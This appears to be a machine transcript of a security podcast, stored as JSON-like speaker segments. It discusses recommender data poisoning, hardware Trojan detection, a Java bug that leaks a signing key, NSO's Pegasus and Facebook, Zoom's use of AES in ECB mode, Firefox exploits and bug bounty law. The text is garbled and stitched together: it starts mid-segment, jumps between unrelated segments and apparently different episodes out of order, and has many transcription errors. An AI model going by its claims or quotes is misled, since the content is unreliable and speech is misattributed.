I think that's a good idea. But with that we'll move on to Our next research topic. So our next one is practical data poisoning attacks against next item recommendation though. This paper proposes a system called Loki guessing, you know, the god of tricks and or Norse mythology. That's probably where they came up with the name because I couldn't find it doesn't seem to be an acronym and it's you know, the system is being proposed for doing data poisoning attacks against black box recommendation systems and what I mean by recommendation systems is you know, Shopping sites, for example where they recommend items to you based on reviews and purchase history and you know the example they go through with is Amazon basically and their system is going to use machine learning to train the attack agent and how they do that is by using a simulator to get around the restrictions you'd have with typical real-world recommendation systems. So they basically run a simulator with a data set. So the example they use is like the Amazon beauty product section. They take like a bunch. Those and and basically make a simulator for that recommendation system and then they try to poison that system which uses a history of like the users actions and stuff like that certain interests and make connections between them and the key paragraph that summarizes what they're doing for some reason I forgot to write down the page number. So I don't know if you could search this one I'm talking about it, but they say the intuition behind such a design is that if to recommend recommenders can both get similar recommendation results and it Given data set the adversarial samples generated for one of the recommended recommenders can be used to attack the other so to pull off this attack. They assumed the attacker can see the full history of all the users in the system. They assume they can inject a limited number of controlled users and that they're hitting a black box system and at the attacker can only receive minimal feedback. They can't see for example, when the Target Model is retrained for testing this they tested against like the Amazon Beauty. It's like I was talking about\", \"start\": 4072.8}, {\"speaker\": 2, \"line\": \" before I do want to jump in and just mention I do feel like one of those things the access to the full activity user of all our sorry full activity history of all users in the recommendation list at is a high condition. That seems like a really high condition everything else seems like they're taking as like what can somebody outside do you know, the limited number of control users not knowing the details limited feedback that one just seems so out of place for everything else like not knowing the details.

Like I'm not sure if maybe I was just a misunderstanding how they were using that or something. But that one really stood out\", \"start\": 4235.1}, {\"speaker\": 1, \"line\": \" to me. Yeah. Yeah. It's a bit weird. But you know when they did their testing they ended up seeing that they could force a display rate of up to 0.5 at 15 activities per user and those are fairly decent results. I mean 50% is quite a lot if you're hitting something. Like Amazon, for example, so, you know, it's kind of interesting hitting like recommendation systems and using machine learning, you know, kind of using AI to attack Ai and a way I think that's kind of cool. But like you were saying that is a good point though that you know, that is a very high conditional consider is considering their whole methodology behind the paper as being able to hit Black Box system though. Yeah. That is that is a bit weird.\", \"start\": 4244.8}, {\"speaker\": 2, \"line\": \" Yeah. That's why I wasn't sure if maybe I was misunderstanding and they only I need like the full history of their controlled subjects or something like that.

I thought the paper was kind of interesting. So, you know, one of the bring up our next paper though, I think is far more interesting and it's on the defense side and it's about Hardware Trojan detection using controlled circuit aging so how they propose to do that is basically using transistor aging to try to detect Hardware back doors and Trojans. So this paper is pretty technical it gets into the hardware level, but essentially what they're proposing is that when the voltage of a Sir goes from high to low. It causes short-term Aging in that transistor and when this happens the current that goes through it is reduced which causes a switching delay which delays timings and causes timing errors in the integrated circuits. And what they do is use machine learning to try to learn the bit error patterns produced from a known clean. I see and then they do the same thing against a potentially malicious I see and compare the results.\", \"start\": 4298.8}, {\"speaker\": 2, \"line\": \" Well, so I mean maybe I was just distracted for a moment.

I was just going to make mention of effectively they find a way to artificially aged the circuit and then they use also over overclocking to kind of result in some higher delays when doing that and then it's the difference that they're finding like the difference in those bit flips the difference in the errors that happen when there's a region versus when there's not a\", \"start\": 4375.5}, {\"speaker\": 1, \"line\": \" Trojan checking for side effects\", \"start\": 4402.2}, {\"speaker\": 2, \"line\": \" based. Yeah, and I thought this is the interest paper not because I totally understood everything here. But because this is an issue that I've known really thought about obviously it exists it matters. It's not in an area that I deal with like I don't deal with hardware at all. John are you I'm really knowledgeable in and but it is an area that like it matters. It's not something I've thought about but it was still kind of interesting like, you know, this is what they're doing. And this is what they're thinking about in terms of trying to detect those Hardware implants those Trojans.\", \"start\": 4404.6}, {\"speaker\": 1, \"line\": \" Yeah. I'm getting into some results when they tested their setup. They ended up testing against some Trojan circuits from trust Hub. So they provide like Trojan circuits for testing for Or like these kinds of projects and they tested against three circuits the basic RS 80 100 a AST 100 and the AST 1000 and when they tested they ended up finding that they had a 99% detection rate against those circuits. So it seems to be like really promising and how accurate it is. That being said they did only test against those three benchmarking circuits. So it is pretty limited. It would be cool to see it. It's results against other circuits, though. That's pretty difficult like getting your hands on like known Trojan circuits is probably not too easy to do so, I don't blame them for that. But you know just know that that test results that is a little bit limited. So you might want to take that 99 percent figure with a you know, grain of salt.\", \"start\": 4437.5}, {\"speaker\": 2, \"line\": \" It's a long. Otherwise that was that 99% is a very good\", \"start\": 4495.4}, {\"speaker\": 1, \"line\": \" result. Oh, yeah sure. It's a long paper. It goes pretty low-level. Like obviously you're dealing with Hardware stuff. But Hardware stuff is always fun to talk about because it's almost like dark magic in a way. A lot of people don't really understand the some of the implications that can happen at that level and using stuff like voltage and current and overclocking and stuff like that to detect these errors and bit flips. Like it's such a low level that like 99% of people do not think about and that's what kind of makes it cool. You know, what it highlights the fact that with Hardware even the most benign things can hold valuable information, which is why it's such an interesting research area. So, you know, definitely One of the bring that up. It's a cool. It's a very fun paper, but it is like it's not incredibly accessible. You can get that higher level view like we did but unless you're like familiar with hardware and the math and some of the you know science at that lower level. You might struggle getting some of the more intricate details of it. Just you know, just as a fair warning I guess.

No, I mean I didn't even try to get the deeper understanding of it to be honest for all my took this as you know, it's interesting area.

Yeah, so she was not a bug that's like, you know a design flaw in the algorithm. It's actually in the implementation and the issue is when they sign the message they pass the message the public key and the hash private key and these arguments should not be changed by the collie function. And this is signaled by using the final keyword. The problem is these parameters are raised and the contents of these Rays can be changed without raising errors, even though it's declared as final because they kind of misunderstood how final worked\", \"start\": 4696.9}, {\"speaker\": 2, \"line\": \" well so it's more I actually even want to put the blame or towards Java on this one. So if you're a c programmer, you're familiar const Char star constant a character array pointer, but when you use that The array itself the contents of it you can't modify it that's the idea of using the constant. A Java doesn't have an equivalent to that Java has this final which if you're not intimately familiar with the Java you my you'd be forgiven for thinking it's you know, the same thing is constant, but it's not that Specter saying it ends up protecting it basically saying like you can only assign a value to this variable or this field wants So it assigns the pointer value basically for the array doesn't act protect the content of it just kind of that initial pointer assignment for and that's kind of how Java does it? So as he's mentioning in Malad which just does like a basic competent or like a modular arithmetic on it? that ends up it passes in the hash private key twice to that function which ends up modifying the message and all I hear you kind of get back to what you were saying\", \"start\": 4730.8}, {\"speaker\": 1, \"line\": \" yeah the issue is because the collie can modify the parameter and it ends up modifying the hash private key and the first 32 bytes of that key is published and that means if you get two messages signed with the same key you can compute the private key see by using an equation to eliminate the modifications that were done to the hatch private key so they have a I think page for they have some those equations that you could use obviously I'm not a I'm not a crypto person I'm not a math major so I don't fully understand these equations but the fact is you know you can end up calculating the differences it's cool paper it is a little bit it's pretty mathy like some of the previous papers we've\", \"start\": 4810.8}, {\"speaker\": 2, \"line\": \" covered it is I mean the key thing though is just that Final aspect like the fact that the values are getting modified ends up reusing this modified value. So the first time through a calculates signature correctly the second time through that hash private key is actually saved its kind of cash and that's where that second time through because it got modified it ends up using a different value and then you kind of figure things out from there.

It's very interesting and it's a very complex malware and you know reversing it took like, you know, V guys and stuff months to do so the fact that it's been reversed and Rewritten. I think that could be very cool to look at for people obviously sucks that you allows from like 2008. It's pretty old now, but you know, it still might be like interesting for people who want to look into how that stuff works. It doesn't seem like the repository has a license.

everyone. Welcome to another episode of the day Zero podcast. You may notice we've picked up a fossil on our way to the podcast today anti is back with us. So I'm Specter with me as e and anti as well, which is nice to be able to say after a long while though. He is only with us for about 30 minutes or so. He's going to have to bail out and do some stuff. So, you know, we haven't for a little bit but not for the full episode but we've got quite a Content packed episode today in terms of topics. So yeah, let's just get right into the first one. So there was an article on Facebook about buying the Pegasus exploit So for anybody is from song go\", \"start\": 8.2}, {\"speaker\": 1, \"line\": \" if on Apple Insider about Facebook, yeah just clarify\", \"start\": 47.2}, {\"speaker\": 3, \"line\": \" that. Yeah, so obviously, I mean this this group NSO has been known to sell spyware in the past to nation-states and stuff like that. But the CEO of the NSO group basically said that Facebook asked to purchase the rights of capabilities. From Pegasus. So according to the CEO Facebook was interested in Pegasus because they had their own app called and overprotect Anova protect, which I think we covered before back when like know what the new we were comforted. We\", \"start\": 52.6}, {\"speaker\": 1, \"line\": \" covered on Facebook research which was kind of like, so an oval protect was banned from the apps Apple App Store and like somewhere in 2019, so to this happened this evening. Event happened with Facebook reaching out to buy some functionality of Pegasus happen in 2017, 2019 and overprotect was banned sometime last year. I think it was during the summer. It was also removed from the Google Play store which then led into Facebook research, which was that bpn that they kind of targeted towards or apparently or allegedly targeted towards teens and they would pay them like 20 bucks a month or whatever. Actually they might have targeted like a Team plus teens not not like 13 to 18. I'm not sure of the details on that but it is slightly different in terms of what type of information it was tracking things like that.\", \"start\": 84.3}, {\"speaker\": 3, \"line\": \" Yeah, so, you know according to the CEO they had went to by the you know by capabilities of Pegasus and apparently it was because they were worried that their app was less effective on iOS compared to Android which makes sense because iOS is like a lot more locked down in terms of privacy barriers and stuff like that than Android typically Facebook of you know, they kind of contradict this they say they're saying statement is meant to distract people from the fact that Facebook is suing in a so which they started like happy. Go for exploiting vulnerabilities and WhatsApp, but what I found interesting was they didn't outright deny the lake allegation. They just kind of said that oh, this is just to distract you from the fact that we're suing them but like, you know, it's weird. They don't outright deny it.\", \"start\": 143.8}, {\"speaker\": 1, \"line\": \" Yeah. Well, I mean, they probably it probably did happen. But the thing is it's unrelated to the fact that they're suing going to so group over the voice exploits and WhatsApp. Yeah, they're suing over one thing. It's kind of unreal a over the facto. Well Facebook also want to buy it is unrelated. So, I mean the fact that Facebook isn't denying get I mean,\", \"start\": 189.7}, {\"speaker\": 3, \"line\": \" I mean, it's hard to get Facebook the the benefit of the doubt after all the stuff they've been involved with\", \"start\": 214.8}, {\"speaker\": 1, \"line\": \" well, I don't think they need the benefit of the doubt. They very well could have tried to buy it. Yeah, I mean and there's not necessarily anything wrong with that. I mean people are immediately going to the facto. Well Facebook's I just tried twist I think anti had some thoughts on this. That's why we had brought him on.\", \"start\": 220.1}, {\"speaker\": 3, \"line\": \" Yeah. No, I mean, I guess I don't know. I mean I looked over the article and I thought you know, the two interesting parts were like the timeline, you know, like the 2017 when they first sounds like approach them to buy, you know, the specific stuff for a novel or only. However, you pronounce it protect. So I think you know what's kind of weird is, you know the timing I probably agree with Facebook and that they're probably Doing it just because they're being sued. So it's perfect, you know kind of cannon fodder but like I think the weird part is now that they're suing them like my weird Twitchy response is that maybe you know, if I had to guess the sounds like something that Facebook was investigating and probably heard about again the exploits that are available so on so forth and was like, well, how do we go and approach this group without seeming like we're investigating them, you know, so what better way than to go and kind of push for something that you're doing and go and say hey,\", \"start\": 238.3}, {\"speaker\": 2, \"line\": \" We'd like to use this to see if\", \"start\": 292.5}, {\"speaker\": 3, \"line\": \" we can further our capability. You know, some part of me just believes that it was like kind of a way to probably you know, still Leverage What they'd find from the NSO group, but also be able to fill those kind of like holes in their capabilities. Does that kind of make sense?\", \"start\": 293.9}, {\"speaker\": 1, \"line\": \" Yeah. Well and I kind of agree with you it does seem like you know, Facebook's a company that's already spending a lot of time trying to track you and trying to get information. Can you make yourself auntie? We're getting some background noise. So Facebook's already spending a lot of time trying to gather a lot of information. No doubt. They have a lot of very smart people trying to do. So so it does seem a little bit suspicious that they're coming to NSO group to try and track users. I like it just feels like this is something that Facebook should probably are probably does already know and that as you were saying there's probably another reason that led to them actually approaching anti so group and I think a very well could have been related to them trying to get like threat Intelligence on what and a so group was doing rather than it being relate to them actually wanting to utilize the techniques out of the malware.\", \"start\": 310.3}, {\"speaker\": 3, \"line\": \" So You think it's a less malicious in nature than it\", \"start\": 370.4}, {\"speaker\": 1, \"line\": \" seems. I'm willing to give Facebook that benefit of the doubt in a sense. That I don't think Facebook was looking to just start spreading spyware. I mean, I think that that just doesn't at least to me it doesn't really fit with and I'm not saying like Facebook is this completely trustworthy company or anything? It's just as a legitimate company. It doesn't seem likely to me that they were looking to actually, you know, just start using spyware and to be clear. They do only asked to use parts of Pegasus. Not the entire thing.\", \"start\": 373.3}, {\"speaker\": 3, \"line\": \" I mean it's worth noting that they also are worth how many billions of dollars you know, and their whole business model is built on you no not spying on user but collecting data on their user. So I'd be surprised to feel like they need to go to a group like NSO group to figure out ways to do that. You know, it just seems a little silly not to say that it isn't something they could have done but you know the more we look at it the more it just seems like why would they even need to go that bar? It'd be a perfect guys though to be able to say. Hey. Eat it for you know, the Privacy aspect we can't get through some of these controls but it is totally possible to to fare as well that they maybe didn't have that capability.\", \"start\": 413.5}, {\"speaker\": 1, \"line\": \" Yeah, I know but\", \"start\": 451.9}, {\"speaker\": 3, \"line\": \" I kind of feel like a lot of people are leaving Facebook with all the pr like, you know battles that they've had with over the past couple years of all the stuff they've tried to pull like with the VPN app, for example that we were talking about earlier. I mean, I think they are having a harder time now collecting the data that they used to be able to collect so it does seem possible that they would want to go that like extra step to try to get more data where they couldn't they can't get as much now as they could\", \"start\": 454.3}, {\"speaker\": 1, \"line\": \" before. Yeah, but this kind of monster was in 2017, though. Like this wasn't like for. Yeah, but approach that. Now this\", \"start\": 481.4}, {\"speaker\": 3, \"line\": \" is was still kind of like\", \"start\": 488.2}, {\"speaker\": 1, \"line\": \" Facebook had a lot of facts is because they still had their own overprotect on the app store which gave them a ton of access. It was in 2019 that Apple changed their terms that stopped allowing basically stopped along Facebook actually no information about like what apps are running and all that detailed information that they would have wanted to collect. So if this were more recent, but in 2017 I mean, they would have had a lot of this information just from the people already installing their application and I mean, could you imagine what would happen if it were found out that Facebook was legitimately just installing malware.\", \"start\": 490.0}, {\"speaker\": 3, \"line\": \" They've already done.\", \"start\": 534.8}, {\"speaker\": 1, \"line\": \" It is in terms of the Outlook from pretty much everybody because if you find out oh Facebook's\", \"start\": 536.6}, {\"speaker\": 3, \"line\": \" just you know, Facebook's\", \"start\": 543.2}, {\"speaker\": 1, \"line\": \" collecting a lot of information you're using their application. There's a I want to say implied consent when you start using Facebook, obviously, there's a ton of websites that tend to include Facebook. Like there's a lot of tracking and information that they're able to get without that. But basically as a legitimate company, I'm not expecting Facebook to go about breaking the law. And actually jailbreak some random person devices which Pegasus does being given a link through methods mentioned writing the document I using paying cyst, you know results in the Target device being jailbroken and the mail were being loaded to Modern steel data. It's one thing for Facebook to be collecting information. It's a completely different thing for Facebooked actually do so in a criminal in a alright.\", \"start\": 545.7}, {\"speaker\": 3, \"line\": \" Manner, but I guess my question is if they were doing this for thread until like you're saying I mean, how does this really help them in any way? Like, what are they going to do with that?\", \"start\": 590.1}, {\"speaker\": 1, \"line\": \" It's being aware of exploits being used against them would be one case\", \"start\": 601.2}, {\"speaker\": 3, \"line\": \" but I guess this was already known like\", \"start\": 606.5}, {\"speaker\": 1, \"line\": \" Pegasus was knowing not necessarily all the details in 2017. I'm glad assume that they Continue to update Pegasus. I can't imagine that they use the same exploits now that they use in 2017 or they'd be using the same exploits in 2017 that they were using in 2015 or 2016 or not me. This is something that NSO groups continuing to sell. I have to assume that part of this process includes, you know updates\", \"start\": 608.5}, {\"speaker\": 3, \"line\": \" but those Let's Plays don't affect Facebook. Like that's why I moved to sit up that we're\", \"start\": 639.0}, {\"speaker\": 1, \"line\": \" gonna so group was using attacks on WhatsApp though, which does\", \"start\": 643.1}, {\"speaker\": 3, \"line\": \" involve Okay. Yeah, that's true. It's good. Yeah fair enough. I'm sorry. I thought you were gonna say something. No, it's good. I think I was just about to see what he said basically is that you know, like wow, it doesn't directly go after them. Didn't they have capability to scrape, you know users information from at least WhatsApp and you know, they may not have told the public their capabilities right up the way so they may have had you know functionality to steal Facebook stuff and you know other products blowing into Facebook. So I mean, I just the simple part of it though is I find it funny weirdly enough that it ever agree with face. A book on the fact that you know, it's weird that they would sell me throw this out there when they knew years ago that it was such an issue. You know, I do find it weird. Also though that if Facebook was trying to you know, go and find more private information of their users, you know, it's like going to try and protect your house with security cameras are being like actually I'm going to go to the Colombian drug cartels and by AK-47s to protect myself that like, it's such a weird Step 2. It doesn't make sense.\", \"start\": 647.3}, {\"speaker\": 1, \"line\": \" Yeah. I don't know so obviously I don't\", \"start\": 706.1}, {\"speaker\": 2, \"line\": \" want Earth\", \"start\": 707.9}, {\"speaker\": 1, \"line\": \" can threat intelligence. So perhaps you'll correct me on this but it feels like it would be kind of up their alley if say Facebook's internal threat team. It just finds out that an assault groups may be doing something against Facebook. Now, I'm actually going to walk back my prior statement. It wouldn't make a lot of sense if NSL group were actually like had exploits are earning Facebook that they would then sell those exploits the Facebook. So I'm going to walk back onto my statement on that. That odds are they weren't going for help. We're necessarily looking for that because if they were they would probably approach and a so group under the cover of some other.\", \"start\": 708.4}, {\"speaker\": 3, \"line\": \" Throat, sorry know what they could have. No, you think could have gone over it a billion ways. I mean the the idea of threat intelligence rights to to stop threats and like some companies like Facebook are probably a little fast and loose with it. So they come up with some koi idea of like a let's go and tell him it's just for this. I mean I if I had to guess the way they wanted it to pan out was that they were probably going to get in there first off. They may have taken the capabilities and may have very well done that to spy on users more and stuff like that, but I think it also could have one of those things that you know NSO group if they sign up Facebook as a client. It's kind of awkward to them be offering functionality to steal your clients crap. Like, you know, you can't you can't be like, oh well now our latest version of this Mauer that we've created steals Facebook user accounts or Whatsapp. Like it's probably a little more sketchy on that end. So they it could have been just a weird roundabout way to get them to stop targeting Facebook and it's you know other companies if you think about it\", \"start\": 749.4}, {\"speaker\": 1, \"line\": \" could have been I mean the thing is Facebook does have a lot of money. Throw around to your so that that kind of just ties in with Azure say like being a little bit fast and loose on that and we'll just come up with some idea and give it a try. I don't know how much money actually goes towards thread until with Facebook but given kind of the size of Facebook. I wouldn't be surprised to find out if there's a pretty substantial amount there. But honestly, I made it on a whole idea. I do agree with you on today feels weird like this is the timing friend is So group releasing that information, obviously, it's released as part of the Court. Court documents so it's not like, you know NSL group just like did immediately could but I don't know to me looking at from the outside. I'm not a lawyer. I don't know the intimate details here. It does feel more or less unrelated only showing that maybe they had a client relationship with Facebook.\", \"start\": 805.4}, {\"speaker\": 3, \"line\": \" It seems like they just want to get a shot in the\", \"start\": 866.2}, {\"speaker\": 1, \"line\": \" face. Yeah. Yeah, definitely.\", \"start\": 867.8}, {\"speaker\": 3, \"line\": \" Yeah, I mean obviously like a lot of the stuff. I've been talking about is speculation. We don't know like all the hard details. Maybe we will see more come out through that lawsuit like in the future. I don't know but yeah, it is like kind of a weird story. Maybe we'll find out more later. That being said, I think we can move on to some Zoomer stuff. So Zoom, is that some pretty bad PR over the last week and this is the first of many courses related to our Feast on zoom in this episode and part of the reason Zoom has gotten so much attention lately is do Self-isolation with you know current world events. It's being used a lot by companies and governments and lots of other places for meetings. So Zoom has had security incidents in the past. So, you know researchers have started looking at it more closely do it being used so much lately and these researchers discovered some issues and that's because Zoom seems to have some disingenuous claims related to crypto that are either not don't seem to be true at all or seem to be misleading\", \"start\": 870.6}, {\"speaker\": 1, \"line\": \" disingenuous or possibly just misunderstanding like written by somebody that doesn't understand that spot like Mark marketing may be doing a lot of fat and and I come at that just because they talk about some one of the things brought up in this is end-to-end encryption Zoom claims are has claims about their end-to-end encryption and like immediately following those claims. Zoom ends up talking about like TLS being used which TLS is definitely crypto, but it generally speaking like anti end is going to be a par from your standard TLS. I'm trying to find the picture. I'm thinking of in the document. But\", \"start\": 934.6}, {\"speaker\": 3, \"line\": \" but I think the other issue is only the key exchange happens over TLS. I don't even think the the actual packet exchange happens over TLS. My am I wrong on that or\", \"start\": 983.1}, {\"speaker\": 1, \"line\": \" I'd have to look into it. But I have to imagine that if the kazoom does have a web interface, so it's going to have to be over http.\", \"start\": 993.8}, {\"speaker\": 3, \"line\": \" So here's the here's the like diagram I was looking at so they have observing a test Zoom call. I don't know if it's scroll down for you, but they have like get ski over TLs, but then the meeting it says it's encrypted with AES over UDP, but\", \"start\": 1002.0}, {\"speaker\": 1, \"line\": \" like, okay, so that's that's a separate\", \"start\": 1018.1}, {\"speaker\": 3, \"line\": \" from it. Yes key is not like end-to-end encryption.\", \"start\": 1020.0}, {\"speaker\": 1, \"line\": \" Yeah. No, like their whole end-to-end encryption is definitely wrong but seems like it's just somebody that doesn't understand what intend encryption actually is. And that could be intentionally misleading or could not other things that are mentioned in here are the they're using AES 256 in reality. It looks like they're using AES 128 and they're using ECB mode. If you're not familiar with the ECB mode actually they have the classic picture in this article classic picture is based with ECB mode. It takes a key and basically just applies. Is it to the block so a s is a cipher or block Cipher? Sorry, it's going to say Cipher block, but it's a block Cipher. So what happens is it splits up whatever your messages whatever you want encoded it gets split up into equal sized blocks and then the key wouldn't you could apply the key in several different ways. You could for example apply the key to the first block and then apply the second block to the following block and kind of chain them along ECB mode basically takes the key. Applies it to the block as so there's no connection between any of the following blocks? So what ends up happening is you end up with these pad if you have patterns in your data is two blocks are the same the resulting ciphertext will be the same. So that's only really an issue if you have data that's going to be repeating. So the classic example is this very much like uncompressed bitmap of the tux penguin. And you'll notice even when it's encrypted if you're able to see our video that you can kind of make out the outline of top so you can see kind of the original image or parts of the original image, even though it's technically encrypted. So that's why ECB mode is a problem. But the reality is when we were talking about audio odds are you're not having a lot of that sort of completely repeating blocks, you know, people are going to speak definitely the audio data is going to be continually changing. So there are things that could be Pulled out you can get information such as Cadence of packets kind of decadence of what's being spoken. There are definitely things that you can leak because of ECB mode but the risk isn't huge in a lot of cases with these female. Again, the problem with ECB is less ACB and more the fact that if you're using it odds are ECB is not the most significant problem in your crypto.\", \"start\": 1024.2}, {\"speaker\": 3, \"line\": \" It's a code smell Birds the crypto\", \"start\": 1182.2}, {\"speaker\": 1, \"line\": \" quibble. It's definitely an issue. It's generally an issue because we use it's the easiest block mode to use pretty much all the other options require some other settings usually like an initialization Vector that would just be like some starting value so that every every encrypted instant sins up starting different and so they'll always kind of be different even when data is the same. So you'll use an IV for that. They need some further data. Whereas doing ECB mode. You need a key and you need the data. It's kind of that classic what you think of crypto if you don't really understand how crypto works. It's like you think that's what you need the data. You need a key. So people who end up use that tend to be the type of people who don't really know the difference. They just know what they want. They want this crypto therefore they use the easiest thing\", \"start\": 1184.4}, {\"speaker\": 3, \"line\": \" available.

So we may see that on like a future episode we can go a little bit more to the specific specifics of that issue.

Um, no, I was just going to say, you know, since the people of crap Emma so much Zoom for a lot of reasons sucks and I don't like you I don't trust it. But at the same time like I do feel bad that I guess in New York, the things the governor for schools that they can't use zoom in. Anymore because of the concerns but I mean, I haven't seen like a of all the campaign's that I currently wash and you know, I don't see anyone targeting Zoom the way that people will blow it up. So I feel bad genuinely that even as a Chinese company, they probably are sketchy a little bit, but I don't know if they definitely deserve like the widespread hey of like, you know, these guys are still in your keys to crypting a conversation.

Okay, you can take that to the bank. Please. Don't kill me how much money get paid. But anyway, I'm gonna do a last-minute topics which are just because you do have to go here in a few minutes. I wanted to bring up the Mozilla advisory. So there's not too much to talk about here because the technical details are actually locked off, but there were there were some security vulnerabilities that were About Firefox one was a use after free through race condition and the NS stock shell the destructor and the other one was another race condition yielding use after free when handling a readable stream. So, you know, these are obviously they're both Firefox issues. We don't have the technical details and I think those bug references are probably going to be locked off forever. I don't think Mozilla ever opens them up to the public. But what made this notable was they noted that the targeted attacks. There's targeted attacks in the Old that are abusing these vulnerabilities and I think I thought that was interesting to see on Firefox because typically when you see that notice on browsers, it's Safari or Chrome because those are the default browsers on mobile operating systems. So I think it's interesting to see targeted attacks hitting Firefox where Firefox doesn't necessarily have the greatest market share when you're talking about browsers. So I was wondering anti do you think this could possibly be targeted the tax on Tor users? Because I know Tory uses Firefox under the hood right\", \"start\": 1678.0}, {\"speaker\": 1, \"line\": \" yes it does Tor Browser does technically you create you can use other browsers\", \"start\": 1781.3}, {\"speaker\": 3, \"line\": \" yes by default the Tor Browser that everyone gets is using Firefox has its base right now are so you're asking specifically if it's likely that is towards towards users or just in general targeting people yeah I was just wondering if like you think that these attacks that are using these vulnerabilities could be going after like Tor users it's like you know slow let's say journalist potentially using a tour for anonymity or something like that heylia dude are you kidding me I mean now I can't say Let me clarify first and foremost I can't 100% say right now that that's happening because I haven't no one obviously if they're being very hush-hush about it this happens every time with some of those well there's a campaign out there like what does that mean who is it you know so I don't know a hundred percent what that means in terms of this the specific one but you know it would be silly and my eyes for any nation state especially some of the more One's targeting various individuals right within the dark web who use Tor Browser and stuff like that. It would be almost nonsensical for them not to leverage that right now assuming that that's what this lens its capability towards right targeting users and exploiting them which it sounds like it does. You know, if you look at most of at least from my understanding the targeting of Tor users a lot of the exploits haven't even been sophisticated or relatively new right? It's always been people using outdated browsers and should I don't think for the most most part you're going to see like a lot of exploits getting dropped on Tor users that are relatively new may be attacking the service itself. But for this specifically to answer question. Yeah. I mean if it's something that targets to our Firefox, which is what's or browser is based off of I would be surprised if they decided no unless they've got so many exploits available. But even then again, it's just something to add to your Arsenal, you know, so I 100% it would be an easy just addition to anything that's assuming they can get the information out there. We don't Enough about the campaign and what details are out there, so it may not even be applicable just yet. If it's something that was only partially observed,\", \"start\": 1786.8}, {\"speaker\": 1, \"line\": \" you know. Yeah, which is a I think Fair Point on that. I mean we can't know for sure who was being targeted with it. I think it's a reasonable to say that the Tor Browser is one of the juicier Target. If you are writing the eau de using it in the wild that said the Firefox users can also be generally are going to be a little bit more technically oriented. So it can also just be a position thing where maybe the Firefox user also happens to be a sysadmin with Access to more stuff or other reasons why you might talk that so it could be unrelated to\", \"start\": 1906.8}, {\"speaker\": 3, \"line\": \" tour. Yeah, okay fair enough. I was just curious on Auntie's take because I didn't know how common those types of attacks were. So yeah, I just you know, I wanted to get that in before you left because I imagine you probably are you going to jump out now anti or are you good for a little while? I'll probably jump out now but yeah, I mean summarize yet, you'll see if it doesn't get released. I don't think you'll use seeing used against a lot of average users because most botnet owners and people, you know, targeting regular people often need the actual POC code itself, so Yeah, no, we know in the targeted.

Thanks. Y'all have a good one. All right, so we'll jump into the bug Bounty platforms topic. So we have a topic by CSO and it's basically saying bug Bounty platforms by researcher silence violate labor laws critics say so, you know one topic we've talked about a lot on this show is bug bounties and You're not disclosure should be allowed and generally I think we agree. It's reasonable to some degree. The vendors have the final say on what a report goes public or if it does at all after it's been reported through Bounty program. Well, it seems that's being challenged. So your\", \"start\": 1987.8}, {\"speaker\": 1, \"line\": \" I at least want to say I think and I want to be really clear Ideal World full transparency. Everyone has bounties Look at that for a sec you could have night in. Yeah. So in an Ideal World will have full transparency all vulnerability reports become made public and everybody has bounties that's kind of your ideal case, I believe but we don't we get there step by step. We're not at that point yet, obviously, and actually I will I will step that back a little bit maybe not every company has bounties. I do believe bounties or some that should be introduced once the Once your security is fairly mature, you don't want to just have somebody. Oh, I just wrote this over the weekend. Well, hey, here's you know a hundred bucks for every bug you find and like, you know, put them out of\", \"start\": 2022.3}, {\"speaker\": 3, \"line\": \" business. Yeah, you end up throwing money away.\", \"start\": 2071.8}, {\"speaker\": 1, \"line\": \" Yeah, like it's part of the maturity process to end up adding a bounty end. But Ideal World is generally speaking one sermon speaking about mature companies and companies that have a mature security process vulnerability should be disclosed. Publicly and and and they should have a bounty and I do also want to adjust as we get started on this draw really quick distinction because we're going to be talking about like nda's and agreements before you're even able to start testing itself that there is there's two kind of types of applications. You could be testing. This is a very wide Description but either an application that is hosted by somebody else. So if you're testing Facebook, you're not self-hosting Facebook or PayPal or something like that. You're not self-hosting those things. Somebody else is hosting its so in order for you to test you need their permission. Otherwise, it's unauthorized access and the Computer Fraud and Abuse Act and the u.s. Is insanely vague when it comes to actually defining what unauthorized access is Although I think actually some of that may have changed recently. There was something about the terms of service not being is binding. Although I know there have been cases where terms of service and basically, well you violate the terms of service. Therefore all your access was unauthorized than it was Computer Fraud and Abuse self sudden, I think something about that changed. I don't follow a lot of the legal cases. So maybe I'm wrong, but generally speaking. I'm just going to be speaking under that assumption unauthorized access. If you don't have permission to be hitting that hopes that application that's somebody else Helsing the other type of application. You can be testing our self hosted things things that you could run locally if you want to test Android if you want to like work on your Android phone you could do that or Linux your operating system running a web server locally. You can test all that kind of self hosted you can do whatever you want on those service. It doesn't matter what the ndaa As you're breaking no laws by doing that local testing. Well, if you violate their dmca can come in there are some things but generally speaking you're not violating any laws by doing that sort of local testing. I just wanted to bring that up because when we talk about bounties most of them are these hosted applications, some of them are self hosted and I think a lot of what's going to come up really has to do more with the hosted applications, which is most bounties that you see on The program like cat or one or bug crowd.\", \"start\": 2074.5}, {\"speaker\": 3, \"line\": \" Okay, so bring up the point you were saying earlier with like in an Ideal World. Everyone would have bounties. It actually seems like some researchers are challenging that a little bit they're pushing for vulnerability Discovery programs instead of bug bounties. I have if there's a little bit of like a different term like set of rules with that. It's a bit more like you can't Outsource it. I think are you\", \"start\": 2235.1}, {\"speaker\": 1, \"line\": \" sure about that? Because I thought it was vulnerability disclosure. Programs not discovery, which is a different part of the process because they talk on V DP which is vulnerability disclosure\", \"start\": 2258.3}, {\"speaker\": 3, \"line\": \" policy. Sorry. That's what I meant VDP.\", \"start\": 2269.5}, {\"speaker\": 1, \"line\": \" Okay. So VDP that was slightly different VDP is and this article actually I think just makes a mistake kind of conflating VP with coordinated disclosure if EDP is just the disclosure program. So having like a Security Act email address or the secure. T dot txt file having a way for researchers to reach out and disclose vulnerabilities to you in a safe way in a way that they're not going to be charged with a crime for doing so that's what the VDP is. Okay. So that's a little bit different bounties separate from that. And yes, every company not just mature companies should have a VDP. Some people do have questions about the bounties will be getting to that later on in this topic. But I guess when we just start off going through in order here, one of the first things that comes off our first issues really raised comes down to the Safe Harbor and NDA. So like I just mentioned reporting a vulnerability you kind of end up in a case where if you report the issue they can then say well that was unauthorized access. We're going to charge you, you know your going to be prosecuted for that crime, even though you're trying to do the right thing by reporting vulnerability and this is definitely happened. And I think I've talked about my views on disclosure of ought over the last few episodes and I think a big part of kind of my weariness and like always deferring to what the company wants comes down to kind of having had my start and the days where people definitely were being resident. They weren't operating in the most Adamant manner, you know testing for SQL injection on every website you visit type thing. But you know, they'd report that and then get charged with the crime for it there. They're testing definitely wasn't. Wasn't in line with what would be considered responsible and I'll be fair to admit that but at the time basically there was no option. Now. You can run vm's you can do with law without needing to actually test on somebody 